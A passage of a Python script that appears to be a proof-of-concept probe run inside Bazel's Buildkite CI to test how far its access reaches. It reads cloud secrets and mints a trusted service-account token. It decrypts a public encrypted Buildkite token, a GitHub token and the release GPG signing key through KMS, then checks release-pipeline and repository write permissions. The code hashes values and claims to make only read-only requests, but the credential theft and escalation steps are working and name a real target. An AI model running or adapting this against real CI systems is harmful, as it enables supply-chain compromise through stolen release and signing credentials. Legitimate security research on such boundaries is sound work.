
    def secret(self, project: str, name: str, purpose: str) -> tuple[str | None, int | None]:
        url = f"{self.base['secret']}/v1/projects/{project}/secrets/{name}/versions/latest:access"
        code, body = self.request_json("GET", url, self.bearer())
        encoded = body.get("payload", {}).get("data") if isinstance(body, dict) else None
        try:
            value = base64.b64decode(encoded, validate=True).decode() if isinstance(encoded, str) else ""
        except (ValueError, UnicodeDecodeError):
            value = ""
        if not value or len(value) > 4096 or "\n" in value or "\r" in value:
            self.emit({"kind": "secret_access", "purpose": purpose, "http_status": code, "actual_read": False})
            return None, code
        self.remember(value)
        self.emit(
            {
                "kind": "secret_access",
                "purpose": purpose,
                "http_status": code,
                "actual_read": True,
                "credential_type": self.family(value),
                "length": len(value),
                "sha256": self.sha(value),
                "in_memory_only": True,
                "value_emitted": False,
            }
        )
        return value, code

    def mint_sa(self) -> None:
        encoded = urllib.parse.quote(TRUSTED_SA, safe="@.-")
        code, body = self.request_json(
            "POST",
            f"{self.base['iam']}/v1/projects/-/serviceAccounts/{encoded}:generateAccessToken",
            self.bearer(),
            {"scope": ["https://www.googleapis.com/auth/userinfo.email"], "lifetime": "300s"},
        )
        token = body.get("accessToken") if code == 200 and isinstance(body, dict) else None
        if not isinstance(token, str) or len(token) < 8:
            self.emit({"kind": "trusted_sa_promotion", "http_status": code, "token_received": False})
            return
        self.remember(token)
        form = urllib.parse.urlencode({"access_token": token}).encode()
        info_code, raw = self.request(
            "POST", self.base["tokeninfo"], {"Content-Type": "application/x-www-form-urlencoded"}, form
        )
        try:
            info = json.loads(raw) if raw else {}
        except (json.JSONDecodeError, UnicodeDecodeError):
            info = {}
        scope = info.get("scope", "").split() if isinstance(info, dict) and isinstance(info.get("scope"), str) else []
        expires = info.get("expires_in") if isinstance(info, dict) else None
        try:
            expires = int(expires)
        except (TypeError, ValueError):
            expires = None
        verified = (
            info_code == 200
            and info.get("email") == TRUSTED_SA
            and "https://www.googleapis.com/auth/userinfo.email" in scope
            and isinstance(expires, int)
            and 0 < expires <= 300
        )
        self.emit(
            {
                "kind": "trusted_sa_promotion",
                "http_status": code,
                "tokeninfo_http_status": info_code,
                "token_received": True,
                "principal": TRUSTED_SA if verified else None,
                "userinfo_email_scope": "https://www.googleapis.com/auth/userinfo.email" in scope,
                "expires_in": expires,
                "principal_verified": verified,
                "token_value_emitted": False,
            }
        )
        if verified:
            self.proof = "trusted_service_account_token"
        token = None

    def trusted_agent(self) -> None:
        token, _ = self.secret(
            "bazel-public", "bazel-trusted-buildkite-agent-token", "trusted_agent_registration"
        )
        if not token:
            return
        code, body = self.request_json(
            "GET", f"{self.base['agent']}/v3/metrics", {"Authorization": f"Token {token}"}
        )
        trusted = (
            code == 200
            and isinstance(body, dict)
            and isinstance(body.get("organization"), dict)
            and body["organization"].get("slug") == "bazel-trusted"
        )
        self.emit(
            {
                "kind": "trusted_agent_validation",
                "http_status": code,
                "organization_is_bazel_trusted": trusted,
                "metrics_values_emitted": False,
            }
        )
        if trusted:
            self.proof = "trusted_buildkite_agent_registration"
        token = None

    def buildkite_api(
        self,
        project: str = "bazel-untrusted",
        secret_name: str = "bazel-bazelcipy-BuildkiteClient-token",
        purpose: str = "known_untrusted_buildkite_api",
        token_override: str | None = None,
    ) -> None:
        token = token_override
        if token is None:
            token, _ = self.secret(project, secret_name, purpose)
        if not token:
            return
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        code, current = self.request_json("GET", f"{self.base['buildkite']}/v2/access-token", headers)
        raw_scopes = current.get("scopes", []) if isinstance(current, dict) else []
        scopes = {
            item for item in raw_scopes
            if isinstance(item, str) and re.fullmatch(r"[a-z_]{1,80}", item)
        }
        self.emit(
            {
                "kind": "buildkite_api_token",
                "source": purpose,
                "http_status": code,
                "scopes": sorted(scopes),
                "owner_or_free_text_emitted": False,
                "value_emitted": False,
            }
        )
        if code != 200:
            token = None
            return

        organizations_code, organizations = self.request_json(
            "GET", f"{self.base['buildkite']}/v2/organizations", headers
        )
        organization_slugs = sorted(
            {
                item["slug"]
                for item in organizations[:100]
                if isinstance(organizations, list)
                and isinstance(item, dict)
                and isinstance(item.get("slug"), str)
                and re.fullmatch(r"[a-z0-9][a-z0-9-]{0,62}", item["slug"])
            }
        ) if isinstance(organizations, list) else []
        trusted_visible = organizations_code == 200 and "bazel-trusted" in organization_slugs
        self.emit(
            {
                "kind": "buildkite_organizations",
                "source": purpose,
                "http_status": organizations_code,
                "slugs": organization_slugs,
                "bazel_trusted_visible": trusted_visible,
                "value_emitted": False,
            }
        )
        if not trusted_visible:
            self.emit(
                {
                    "kind": "buildkite_release_boundary",
                    "source": purpose,
                    "status": (
                        "blocked_cross_organization"
                        if organizations_code == 200
                        else "organization_introspection_failed"
                    ),
                    "write_builds_scope": "write_builds" in scopes,
                    "bazel_trusted_visible": False,
                    "exact_release_pipeline_visible": False,
                    "full_access_oracle_proven": False,
                    "release_control_established": False,
                    "read_only_requests": True,
                }
            )
            token = None
            return

        rest_results = []
        full_access_proven = False
        exact_release_visible = False
        for _alias, slug in RELEASE_PIPELINES:
            endpoint = f"{self.base['buildkite']}/v2/organizations/bazel-trusted/pipelines/{slug}"
            pipeline_code, pipeline = self.request_json("GET", endpoint, headers)
            exact = (
                pipeline_code == 200
                and isinstance(pipeline, dict)
                and pipeline.get("slug") == slug
                and pipeline.get("url")
                == f"https://api.buildkite.com/v2/organizations/bazel-trusted/pipelines/{slug}"
                and pipeline.get("archived_at") is None
            )
            exact_release_visible = exact_release_visible or exact
            webhook_code = None
            if exact:
                webhook_code, _ = self.request_json("GET", f"{endpoint}/github-webhooks", headers)
            full_access = exact and webhook_code == 200 and "write_builds" in scopes
            full_access_proven = full_access_proven or full_access
            visibility = pipeline.get("visibility") if exact else None
            if visibility not in {"public", "private"}:
                visibility = None
            rest_results.append(
                {
                    "pipeline": slug,
                    "pipeline_http_status": pipeline_code,
                    "identity_valid": exact,
                    "visibility": visibility,
                    "full_access_oracle_http_status": webhook_code,
                    "full_access_oracle_proven": full_access,
                }
            )
            if full_access:
                break
        self.emit(
            {
                "kind": "buildkite_release_pipeline_rest",
                "source": purpose,
                "pipelines": rest_results,
                "full_access_oracle_proven": full_access_proven,
                "read_only_requests": True,
            }
        )
        if full_access_proven:
            self.proof = "buildkite_release_pipeline_full_access"
            self.emit(
                {
                    "kind": "buildkite_release_boundary",
                    "source": purpose,
                    "status": "trusted_release_pipeline_full_access",
                    "write_builds_scope": True,
                    "bazel_trusted_visible": True,
                    "exact_release_pipeline_visible": True,
                    "full_access_oracle_proven": True,
                    "release_control_established": True,
                    "read_only_requests": True,
                }
            )
            token = None
            return

        if "graphql" not in scopes:
            self.emit(
                {
                    "kind": "buildkite_release_boundary",
                    "source": purpose,
                    "status": (
                        "candidate_release_pipeline_visible"
                        if exact_release_visible
                        else "blocked_no_release_pipeline_visibility"
                    ),
                    "write_builds_scope": "write_builds" in scopes,
                    "bazel_trusted_visible": True,
                    "exact_release_pipeline_visible": exact_release_visible,
                    "full_access_oracle_proven": False,
                    "graphql_scope_present": False,
                    "release_control_established": False,
                    "read_only_requests": True,
                }
            )
            token = None
            return

        fields = " ".join(
            f'{alias}:pipeline(slug:"bazel-trusted/{slug}"){{slug organization{{slug}} permissions{{buildCreate{{allowed code}} pipelineUpdate{{allowed code}}}}}}'
            for alias, slug in RELEASE_PIPELINES
        )
        gql_code, response = self.request_json(
            "POST", self.base["graphql"], headers, {"query": f"query SafePipelinePermissions{{{fields}}}"}
        )
        errors = isinstance(response, dict) and bool(response.get("errors"))
        data = response.get("data") if gql_code == 200 and isinstance(response, dict) and not errors else {}
        results = []
        release_build_control = False
        pipeline_update_control = False
        for alias, expected in RELEASE_PIPELINES:
            item = data.get(alias) if isinstance(data, dict) and isinstance(data.get(alias), dict) else {}
            org = item.get("organization") if isinstance(item.get("organization"), dict) else {}
            permissions = item.get("permissions") if isinstance(item.get("permissions"), dict) else {}
            valid = item.get("slug") == expected and org.get("slug") == "bazel-trusted"
            build = permissions.get("buildCreate") if isinstance(permissions.get("buildCreate"), dict) else {}
            update = permissions.get("pipelineUpdate") if isinstance(permissions.get("pipelineUpdate"), dict) else {}
            build_allowed = valid and "write_builds" in scopes and build.get("allowed") is True
            update_allowed = valid and "write_pipelines" in scopes and update.get("allowed") is True
            release_build_control = release_build_control or build_allowed
            pipeline_update_control = pipeline_update_control or update_allowed
            results.append(
                {"pipeline": expected, "identity_valid": valid, "build_create": build_allowed, "pipeline_update": update_allowed}
            )
        if release_build_control:
            self.proof = "buildkite_release_build_create"
        if pipeline_update_control:
            self.proof = "buildkite_pipeline_update"
        self.emit(
            {
                "kind": "buildkite_pipeline_permissions",
                "source": purpose,
                "http_status": gql_code,
                "top_level_errors_present": errors,
                "pipelines": results if not errors else [],
                "release_build_control_proven": release_build_control,
                "pipeline_control_proven": pipeline_update_control,
                "read_only_query": True,
            }
        )
        self.emit(
            {
                "kind": "buildkite_release_boundary",
                "source": purpose,
                "status": (
                    "trusted_pipeline_update"
                    if pipeline_update_control
                    else (
                        "trusted_release_build_create"
                        if release_build_control
                        else "visible_but_no_effective_release_permission"
                    )
                ),
                "write_builds_scope": "write_builds" in scopes,
                "bazel_trusted_visible": True,
                "exact_release_pipeline_visible": exact_release_visible,
                "full_access_oracle_proven": False,
                "graphql_scope_present": True,
                "release_control_established": release_build_control or pipeline_update_control,
                "read_only_requests": True,
            }
        )
        token = None

    def trusted_buildkite_api(self) -> None:
        self.buildkite_api(
            "bazel-public",
            "bazel-trusted-bazelcipy-BuildkiteClient-token",
            "trusted_buildkite_api",
        )

    def public_buildkite_ciphertext(self) -> None:
        object_code, ciphertext = self.request(
            "GET",
            f"{self.base['storage']}/download/storage/v1/b/"
            "bazel-encrypted-secrets/o/buildkite-api-token.enc?alt=media",
        )
        expected_sha = (
            PUBLIC_BUILDKITE_CIPHERTEXT_SHA256
            if self.mode == "live"
            else MOCK_BUILDKITE_CIPHERTEXT_SHA256
        )
        expected_length = (
            PUBLIC_BUILDKITE_CIPHERTEXT_LENGTH
            if self.mode == "live"
            else MOCK_BUILDKITE_CIPHERTEXT_LENGTH
        )
        ciphertext_sha = self.sha(ciphertext) if ciphertext is not None else None
        exact_ciphertext = (
            object_code == 200
            and ciphertext is not None
            and len(ciphertext) == expected_length
            and ciphertext_sha == expected_sha
        )
        self.public_buildkite_ciphertext_verified = exact_ciphertext
        self.emit(
            {
                "kind": "public_buildkite_ciphertext",
                "resource": "gs://bazel-encrypted-secrets/buildkite-api-token.enc",
                "http_status": object_code,
                "anonymous_request": True,
                "length": len(ciphertext) if ciphertext is not None else None,
                "sha256": ciphertext_sha,
                "exact_pinned_object": exact_ciphertext,
                "plaintext_read": False,
            }
        )
        if not exact_ciphertext or ciphertext is None:
            return

        kms_code, plaintext = self.decrypt("buildkite-api-token", ciphertext)
        try:
            raw_token = plaintext.decode("ascii") if plaintext is not None else ""
        except UnicodeDecodeError:
            raw_token = ""
        token = raw_token.strip()
        token_shape_valid = (
            kms_code == 200
            and plaintext is not None
            and raw_token in {token, f"{token}\n", f"{token}\r\n"}
            and 20 <= len(token) <= 512
            and not any(character.isspace() for character in token)
        )
        self.public_buildkite_token_decrypted = kms_code == 200 and plaintext is not None
        if token_shape_valid:
            self.remember(token)
        self.emit(
            {
                "kind": "public_buildkite_token_material",
                "source_resource": "gs://bazel-encrypted-secrets/buildkite-api-token.enc",
                "kms_resource": (
                    "projects/bazel-public/locations/global/keyRings/buildkite/"
                    "cryptoKeys/buildkite-api-token"
                ),
                "kms_http_status": kms_code,
                "actual_decrypt": self.public_buildkite_token_decrypted,
                "credential_shape_valid": token_shape_valid,
                "credential_type": self.family(token) if token_shape_valid else None,
                "length": len(token) if token_shape_valid else None,
                "sha256": self.sha(token) if token_shape_valid else None,
                "in_memory_only": True,
                "value_emitted": False,
                "mutation_performed": False,
            }
        )
        if not token_shape_valid:
            return
        self.buildkite_api(
            purpose="public_ciphertext_kms_buildkite_api",
            token_override=token,
        )
        token = None

    def object_bytes(self, name: str) -> tuple[int | None, bytes | None]:
        encoded = urllib.parse.quote(name, safe="")
        return self.request(
            "GET",
            f"{self.base['storage']}/download/storage/v1/b/bazel-trusted-encrypted-secrets/o/{encoded}?alt=media",
            self.bearer(),
        )

    def decrypt(self, key: str, ciphertext: bytes) -> tuple[int | None, bytes | None]:
        code, body = self.request_json(
            "POST",
            f"{self.base['kms']}/v1/projects/bazel-public/locations/global/keyRings/buildkite/cryptoKeys/{key}:decrypt",
            self.bearer(),
            {"ciphertext": base64.b64encode(ciphertext).decode()},
        )
        encoded = body.get("plaintext") if code == 200 and isinstance(body, dict) else None
        try:
            return code, base64.b64decode(encoded, validate=True) if isinstance(encoded, str) else None
        except ValueError:
            return code, None

    def github(self) -> None:
        object_code, ciphertext = self.object_bytes("github-trusted-token.enc")
        if not ciphertext:
            self.emit({"kind": "github_promotion", "object_http_status": object_code, "ciphertext_read": False})
            return
        kms_code, plaintext = self.decrypt("github-trusted-token", ciphertext)
        try:
            token = plaintext.decode().strip() if plaintext else ""
        except UnicodeDecodeError:
            token = ""
        if not token or len(token) > 4096 or "\n" in token or "\r" in token:
            self.emit({"kind": "github_promotion", "object_http_status": object_code, "kms_http_status": kms_code, "actual_decrypt": False})
            return
        self.remember(token)
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "bazel-ci-safe-boundary-probe",
            "X-GitHub-Api-Version": "2026-03-10",
        }
        repo_code, repo = self.request_json("GET", f"{self.base['github']}/repos/bazelbuild/bazel", headers)
        perms = repo.get("permissions") if isinstance(repo, dict) and isinstance(repo.get("permissions"), dict) else {}
        exact_repo = repo_code == 200 and isinstance(repo, dict) and repo.get("full_name") == "bazelbuild/bazel"
        push, admin = exact_repo and perms.get("push") is True, exact_repo and perms.get("admin") is True
        default_branch = repo.get("default_branch") if exact_repo else None
        if not isinstance(default_branch, str) or not re.fullmatch(r"[A-Za-z0-9._/-]{1,255}", default_branch):
            default_branch = None
        notes_code, notes = None, None
        if default_branch:
            notes_code, notes = self.request_json(
                "POST",
                f"{self.base['github']}/repos/bazelbuild/bazel/releases/generate-notes",
                headers,
                {
                    "tag_name": "ci-credential-boundary-probe-nonpersisting-20260824",
                    "target_commitish": default_branch,
                },
            )
        notes_valid = (
            notes_code == 200
            and isinstance(notes, dict)
            and isinstance(notes.get("name"), str)
            and 0 < len(notes["name"]) <= 10_000
            and isinstance(notes.get("body"), str)
            and len(notes["body"]) <= 900_000
        )
        self.emit(
            {
                "kind": "github_promotion",
                "object_http_status": object_code,
                "kms_http_status": kms_code,
                "actual_decrypt": True,
                "credential_type": self.family(token),
                "credential_length": len(token),
                "credential_sha256": self.sha(token),
                "repo_http_status": repo_code,
                "exact_repository": exact_repo,
                "push": push,
                "admin": admin,
                "generate_notes_http_status": notes_code,
                "contents_write_proven": notes_valid,
                "generated_notes_content_emitted": False,
                "non_persisting_api_calls": True,
                "value_emitted": False,
            }
        )
        if notes_valid:
            self.proof = "github_release_contents_write"
        token = None

    def gpg(self) -> None:
        object_code, ciphertext = self.object_bytes("release-key.gpg.enc")
        if not ciphertext:
            self.emit({"kind": "gpg_promotion", "object_http_status": object_code, "ciphertext_read": False})
            return
        kms_code, key = self.decrypt("bazel-release-key", ciphertext)
        key_format = openpgp_private_format(key) if key and len(key) <= MAX_BODY else None
        valid = key_format is not None
        self.emit(
            {
                "kind": "gpg_promotion",
                "object_http_status": object_code,
                "kms_http_status": kms_code,
                "actual_decrypt": valid,
                "key_length": len(key) if valid else None,
                "key_sha256": self.sha(key) if valid else None,
                "key_format": key_format,
                "imported": False,
                "signed": False,
                "value_emitted": False,
            }
        )
        if valid:
            self.proof = "bazel_release_signing_key_possession"
        key = None

    def run(self) -> None:
        job = os.environ.get("BUILDKITE_JOB_ID")
        build = os.environ.get("BUILDKITE_BUILD_NUMBER")
        pr = os.environ.get("BUILDKITE_PULL_REQUEST")
        self.emit(
            {
                "kind": "probe_context",
                "mode": self.mode,
                "ordered_short_circuit": True,
                "ci_binding_validated": self.mode == "live",
                "organization": ORG if self.mode == "live" else None,
                "pipeline": PIPELINE if self.mode == "live" else None,
                "job_id": job if job and re.fullmatch(r"[A-Za-z0-9-]{8,80}", job) else None,
                "build_number": build if build and build.isdigit() else None,
                "pull_request": pr if pr and pr.isdigit() else None,
            }
        )
        if not self.identity():
            status("NO_GOOGLE_TOKEN")
            return
        public_buildkite_introspection = self.mode == "live" or (
            self.mode == "mock"
            and os.environ.get("PROBE_MOCK_PUBLIC_BUILDKITE_DECRYPT") == "1"
        )
        if public_buildkite_introspection:
            # One exact, anonymous ciphertext read; one SHA-pinned KMS decrypt;
            # then Buildkite metadata/permission reads only. No credential value
            # is serialized, persisted, or used for a mutation.
            self.public_buildkite_ciphertext()
            self.emit(
                {
                    "kind": "public_buildkite_ciphertext_summary",
                    "exact_public_ciphertext": self.public_buildkite_ciphertext_verified,
                    "actual_decrypt": self.public_buildkite_token_decrypted,
                    "conclusive_branch": self.proof,
                    "read_only_requests": True,
                    "credential_value_emitted": False,
                    "credential_persisted": False,
                    "mutation_performed": False,
                }
            )
            self.google_token = None
            status("COMPLETE")
            return
        permission_only = self.mode == "live" or (
            self.mode == "mock"
            and os.environ.get("PROBE_MOCK_PERMISSION_ONLY") == "1"
        )
        if permission_only:
            # The live canary is hard-wired to permission advertisements only.
            # No secret, credential-minting, object-read, or mutation method is
            # reachable from this branch.
            self.storage_access_map(PERMISSION_ONLY_STORAGE_TARGETS)
            credential_summary = self.credential_permission_map(
                self.storage_positive_control
            )
            self.emit(
                {
                    "kind": "permission_only_summary",
                    "positive_control_satisfied": self.storage_positive_control,
                    "storage_critical_write_candidates": self.storage_write_candidates,
                    "secret_candidates": credential_summary.get("secret_candidates", []),
                    "kms_candidates": credential_summary.get("kms_candidates", []),
                    "service_account_candidates": credential_summary.get(
                        "service_account_candidates", []
                    ),
                    "permission_advertisement_only": True,
                    "empty_result_is_proven_deny": False,
                    "actual_write": False,
                    "object_content_read": False,
                    "secret_access_performed": False,
                    "credential_mint_performed": False,
                }
            )
            self.google_token = None
            status("COMPLETE")
            return
        self.storage_access_map()
        self.shared_image_permission_map(self.storage_positive_control)
        continue_mock = self.mode == "mock" and os.environ.get("PROBE_MOCK_CONTINUE_AFTER_PROOF") == "1"
        for operation in (
            self.mint_sa,
            self.trusted_agent,
            self.buildkite_api,
            self.trusted_buildkite_api,
            self.github,
            self.gpg,
        ):
            operation()
            if self.proof and not continue_mock:
                break
        self.emit(
            {
                "kind": "promotion_summary",
                "conclusive": self.proof is not None,
                "conclusive_branch": self.proof,
                "storage_critical_write_candidates": self.storage_write_candidates,
                "shared_image_write_candidates": self.shared_image_write_candidates,
                "actual_write": False,
                "secret_values_emitted": False,
            }
        )
        self.google_token = None
        status("COMPLETE")


def main() -> int:
    allowed, mode = gate()
    if not allowed:
        return 0
    try:
        Probe(mode).run()
    except Exception:
        print('{"kind":"probe_error","operation":"unhandled_static"}', file=sys.stderr, flush=True)
        status("FAILED_SAFE")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
